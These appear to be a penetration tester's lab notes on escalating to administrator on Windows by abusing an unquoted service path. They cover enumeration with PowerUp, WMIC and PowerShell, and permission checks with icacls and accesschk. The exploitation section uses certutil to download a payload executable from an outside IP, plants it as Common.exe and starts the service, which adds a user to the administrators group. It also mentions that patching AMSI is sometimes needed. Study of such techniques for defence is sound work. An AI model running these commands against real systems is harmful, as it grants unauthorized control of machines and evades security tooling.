



# Enumeration

## Automatic

From powersploit invoke-allcheck

```
ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True
```


## manual 


```
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```


powershell equivielant

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```

### Inspection

What we are doing is seeing where we are allowed to write, since we know the full path we incrementally check the permissions of every path and then see where we can edit

```
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
icacls "C:\Program Files\Unquoted Path Service\Common Files"
```

lets apply this

```
C:\Users\user>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\user>icacls "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\user>icacls "C:\Program Files\Unquoted Path Service\Common Files"
C:\Program Files\Unquoted Path Service\Common Files NT SERVICE\TrustedInstaller:(I)(F)
                                                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                    NT AUTHORITY\SYSTEM:(I)(F)
                                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                    BUILTIN\Administrators:(I)(F)
                                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                    BUILTIN\Users:(I)(RX)
                                                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\user>
```



### Manual using accessscheck

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvud "C:\Program Files\"
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvud "C:\Program Files\Unquoted Path Service"
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvud "C:\Program Files\Unquoted Path Service\Common Files\"
```

```
C:\Program Files\Unquoted Path Service>C:\Users\User\Desktop\Tools\Accesschk\acc
esschk64.exe -wvud "C:\Program Files\"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\TrustedInstaller
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL
```

Nothing


```
C:\Program Files\Unquoted Path Service>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvud "C:\Program Files\Unquoted Path Service"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
        FILE_ALL_ACCESS
  RW NT SERVICE\TrustedInstaller
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

Here we can see that we are as users we have full `FILE_ALL_ACCESS` so thats the path we need to go for


```
C:\Program Files\Unquoted Path Service>C:\Users\User\Desktop\Tools\Accesschk\acc
esschk64.exe -wvud "C:\Program Files\Unquoted Path Service\Common Files\"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Unquoted Path Service\Common Files
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\TrustedInstaller
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

still nothing
## exploitation

since we know we can add files inside of `C:\Program Files\Unquoted Path Service` we know that the next directory is `Common Files` so we can have a EXE with the `Common` name

```
C:\Program Files\Unquoted Path Service>certutil.exe -urlcache -split -f http://1
0.8.11.58:9090/Unquoted.exe Common.exe
****  Online  ****
  000000  ...
  01c22b
CertUtil: -URLCache command FAILED: 0x80070020 (WIN32: 32)
CertUtil: The process cannot access the file because it is being used by another
 process.

C:\Program Files\Unquoted Path Service>dir
 Volume in drive C has no label.
 Volume Serial Number is F8D5-CDBC

 Directory of C:\Program Files\Unquoted Path Service

07/23/2024  11:13 AM    <DIR>          .
07/23/2024  11:13 AM    <DIR>          ..
04/15/2020  09:42 AM    <DIR>          Common Files
07/23/2024  10:45 AM           115,243 Common.exe
               1 File(s)        115,243 bytes
               3 Dir(s)  51,204,763,648 bytes free

C:\Program Files\Unquoted Path Service>sc start unquotedsvc

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2472
        FLAGS              :

C:\Program Files\Unquoted Path Service>
```


```
C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
sawyer
TCM
The command completed successfully.
```




## Automated exploitation

This also works the issue with it is that sometimes you get access denied and patching AMSI is required
https://powersploit.readthedocs.io/en/latest/Privesc/Write-ServiceBinary/

```
PS C:\Program Files\Unquoted Path Service> Write-ServiceBinary -Name 'unquotedsvc' -Path "C:\Program Files\Unquoted Path Service" -UserName "user"
Set-Content : Access to the path 'C:\Program Files\Unquoted Path Service' is denied.
```




https://juggernaut-sec.com/unquoted-service-paths/